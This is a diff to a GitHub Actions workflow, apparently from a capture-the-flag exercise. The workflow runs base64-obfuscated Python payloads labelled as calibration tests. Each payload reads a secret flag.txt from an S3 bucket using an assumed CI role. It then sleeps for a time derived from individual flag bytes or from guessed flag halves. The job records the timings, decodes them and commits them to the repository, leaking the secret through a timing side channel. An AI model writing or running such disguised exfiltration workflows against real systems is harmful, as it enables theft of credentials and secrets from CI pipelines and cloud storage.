@@ -25,13 +25,22 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Flag length and rstrip verification
+      - name: Phase 2 HI re-run with calibration + half tests
         run: |
-          B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCgwKQ=="
-          B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg0KQ=="
-          B64_LEN="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIHJhdz1ib3RvMy5jbGllbnQoY2hyKDExNSkrY2hyKDUxKSkuZ2V0X29iamVjdChCdWNrZXQ9ImNvZGVjNGYyNmM4NjJhMzIxZWY1IixLZXk9ImZsYWcudHh0IilbIkJvZHkiXS5yZWFkKCkKICB0aW1lLnNsZWVwKGxlbihyYXcpLTEyKQpleGNlcHQ6CiAgdGltZS5zbGVlcCgxKQ=="
-          B64_RSTRIP="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KGNocigxMTUpK2Nocig1MSkpLmdldF9vYmplY3QoQnVja2V0PSJjb2RlYzRmMjZjODYyYTMyMWVmNSIsS2V5PSJmbGFnLnR4dCIpWyJCb2R5Il0ucmVhZCgpLnJzdHJpcChiIlxuIikKICBpZiBmbGFnPT1ieXRlcyhbMHg0MywweDQ5LDB4OTgsMHg5MywweDg0LDB4ODYsMHg0OSwweDQzLDB4OEMsMHg5QywweDQ1LDB4NEEsMHg4QywweDk5LDB4ODYsMHg4Ml0pOgogICAgdGltZS5zbGVlcCgxMCkKICBlbHNlOgogICAgdGltZS5zbGVlcCgyKQpleGNlcHQ6CiAgcGFzcw=="
-          B64_ANALYZE="d2l0aCBvcGVuKCJjYWxpYnJhdGUudHh0IikgYXMgZjoKICAgIGxpbmVzID0gW2wuc3RyaXAoKSBmb3IgbCBpbiBmIGlmIGwuc3RyaXAoKV0KZGF0YSA9IHt9CmZvciBsIGluIGxpbmVzOgogICAgbmFtZSwgbXMgPSBsLnJzcGxpdCgiICIsIDEpCiAgICBkYXRhW25hbWVdID0gaW50KG1zLnJzdHJpcCgibXMiKSkKb3ZlcmhlYWQgPSAoZGF0YS5nZXQoImNhbF9zbGVlcDAiLDApICsgZGF0YS5nZXQoImNhbF9zbGVlcDBfMiIsMCkpIC8gMgpwcmludChmIkVzdGltYXRlZCBvdmVyaGVhZCAoUzMrbmV0d29yayk6IHtvdmVyaGVhZDouMGZ9bXMiKQpjYWw0ID0gKGRhdGEuZ2V0KCJjYWxfc2xlZXA0IiwwKSArIGRhdGEuZ2V0KCJjYWxfc2xlZXA0XzIiLDApKSAvIDIKcHJpbnQoZiJDYWxpYnJhdGVkIHNsZWVwKDQpOiB7Y2FsNDouMGZ9bXMgLT4gYWN0dWFsIG92ZXJoZWFkOiB7Y2FsNC00MDAwOi4wZn1tcyIpCmZvciBrIGluIFsiZmxhZ19sZW5fY2hlY2siLCAicnN0cmlwX2NtcCJdOgogICAgbXMgPSBkYXRhLmdldChrLCAwKQogICAgYWRqID0gbXMgLSBvdmVyaGVhZAogICAgcHJpbnQoZiJ7a306IHttc31tcyAtPiBhZGp1c3RlZCB7YWRqOi4wZn1tcyAtPiBzbGVlcH57cm91bmQoYWRqLzEwMDApfXMiKQ=="
+          B64_b2hi_0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1swXT4+NCktNSkp"
+          B64_b2hi_2="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1syXT4+NCktNSkp"
+          B64_b2hi_3="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1szXT4+NCktNSkp"
+          B64_b2hi_4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1s0XT4+NCktNSkp"
+          B64_b2hi_5="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1s1XT4+NCktNSkp"
+          B64_b2hi_8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1s4XT4+NCktNSkp"
+          B64_b2hi_9="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1s5XT4+NCktNSkp"
+          B64_b2hi_12="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1sxMl0+PjQpLTUpKQ=="
+          B64_b2hi_13="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1sxM10+PjQpLTUpKQ=="
+          B64_b2hi_14="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1sxNF0+PjQpLTUpKQ=="
+          B64_b2hi_15="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcChtYXgoMSwoZmxhZ1sxNV0+PjQpLTUpKQ=="
+          B64_first_half="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCiAgaWYgZmxhZ1s6OF09PWJ5dGVzKFsweDQzLDB4NDksMHg5OCwweDkzLDB4ODQsMHg4NiwweDQ5LDB4NDNdKToKICAgIHRpbWUuc2xlZXAoMTApCiAgZWxzZToKICAgIHRpbWUuc2xlZXAoMikKZXhjZXB0OgogIHBhc3M="
+          B64_second_half="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCiAgaWYgZmxhZ1s4Ol09PWJ5dGVzKFsweDhDLDB4OUMsMHg0NSwweDRBLDB4OEMsMHg5OSwweDg2LDB4ODJdKToKICAgIHRpbWUuc2xlZXAoMTApCiAgZWxzZToKICAgIHRpbWUuc2xlZXAoMikKZXhjZXB0OgogIHBhc3M="
+          B64_ANALYZE="d2l0aCBvcGVuKCJjYWxpYnJhdGUudHh0IikgYXMgZjoKICAgIGxpbmVzID0gW2wuc3RyaXAoKSBmb3IgbCBpbiBmIGlmIGwuc3RyaXAoKV0KZGF0YSA9IHt9CmZvciBsIGluIGxpbmVzOgogICAgcGFydHMgPSBsLnJzcGxpdCgiICIsIDEpCiAgICBpZiBsZW4ocGFydHMpID09IDI6CiAgICAgICAgZGF0YVtwYXJ0c1swXV0gPSBpbnQocGFydHNbMV0ucnN0cmlwKCJtcyIpKQoKIyBDYWxpYnJhdGlvbjogYnl0ZVswXSBoYXMgaGk9NCwgc28gUGhhc2UySEkgZ2l2ZXMgc2xlZXA9bWF4KDEsNC01KT0xcwpjYWxfaGk0ID0gZGF0YS5nZXQoImIyaGlfMCIsIDApCm92ZXJoZWFkID0gY2FsX2hpNCAtIDEwMDAKcHJpbnQoZiJDYWwgYnl0ZVswXV9oaSAoaGk9NCwgc2xlZXA9MSk6IHtjYWxfaGk0fW1zIC0+IG92ZXJoZWFkPXtvdmVyaGVhZH1tcyIpCgpmb3IgaSBpbiBbMiwzLDQsNSw4LDksMTIsMTMsMTQsMTVdOgogICAgbXMgPSBkYXRhLmdldChmImIyaGlfe2l9IiwgMCkKICAgIGlmIG1zID09IDA6CiAgICAgICAgcHJpbnQoZiJieXRlW3tpfV1faGk6IE1JU1NJTkciKTsgY29udGludWUKICAgIGFkaiA9IG1zIC0gb3ZlcmhlYWQKICAgIHNsZWVwX2VzdCA9IHJvdW5kKGFkaiAvIDEwMDApCiAgICBoaSA9IHNsZWVwX2VzdCArIDUgaWYgc2xlZXBfZXN0ID49IDEgZWxzZSAiRVJSIgogICAgcHJpbnQoZiJieXRlW3tpfV1faGk6IHttc31tcyAtPiBhZGo9e2Fkan1tcyAtPiBzbGVlcH57c2xlZXBfZXN0fXMgLT4gaGk9e2hpfSIpCgpmb3IgayBpbiBbImZpcnN0X2hhbGYiLCJzZWNvbmRfaGFsZiJdOgogICAgbXMgPSBkYXRhLmdldChrLCAwKQogICAgaWYgbXMgPT0gMDoKICAgICAgICBwcmludChmIntrfTogTUlTU0lORyIpOyBjb250aW51ZQogICAgYWRqID0gbXMgLSBvdmVyaGVhZAogICAgdmVyZGljdCA9ICJDT1JSRUNUIChzbGVlcD0xMCkiIGlmIGFkaiA+IDYwMDAgZWxzZSAiV1JPTkcgKHNsZWVwPTIpIgogICAgcHJpbnQoZiJ7a306IHttc31tcyAtPiBhZGo9e2Fkan1tcyAtPiB7dmVyZGljdH0iKQ=="
 
           touch calibrate.txt
 
@@ -47,14 +56,21 @@ jobs:
             echo "$name ${MS}ms" | tee -a calibrate.txt
           }
 
-          run_timed "cal_sleep0" "$B64_CAL0"
-          run_timed "cal_sleep4" "$B64_CAL4"
-          run_timed "flag_len_check" "$B64_LEN"
-          run_timed "rstrip_cmp" "$B64_RSTRIP"
-          run_timed "cal_sleep0_2" "$B64_CAL0"
-          run_timed "cal_sleep4_2" "$B64_CAL4"
+          run_timed "b2hi_0" "$B64_b2hi_0"
+          run_timed "b2hi_2" "$B64_b2hi_2"
+          run_timed "b2hi_3" "$B64_b2hi_3"
+          run_timed "b2hi_4" "$B64_b2hi_4"
+          run_timed "b2hi_5" "$B64_b2hi_5"
+          run_timed "b2hi_8" "$B64_b2hi_8"
+          run_timed "b2hi_9" "$B64_b2hi_9"
+          run_timed "b2hi_12" "$B64_b2hi_12"
+          run_timed "b2hi_13" "$B64_b2hi_13"
+          run_timed "b2hi_14" "$B64_b2hi_14"
+          run_timed "b2hi_15" "$B64_b2hi_15"
+          run_timed "first_half" "$B64_first_half"
+          run_timed "second_half" "$B64_second_half"
 
-          echo "=== RESULTS ==="
+          echo "=== PHASE 2 HI RE-RUN RESULTS ==="
           cat calibrate.txt
           echo "$B64_ANALYZE" | base64 -d | python3
 
@@ -63,5 +79,5 @@ jobs:
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
           git add calibrate.txt
-          git commit -m "flag len + rstrip verification [skip ci]" || echo "Nothing to commit"
+          git commit -m "phase2hi rerun with calibration + half tests [skip ci]" || echo "Nothing to commit"
           git push origin corgi
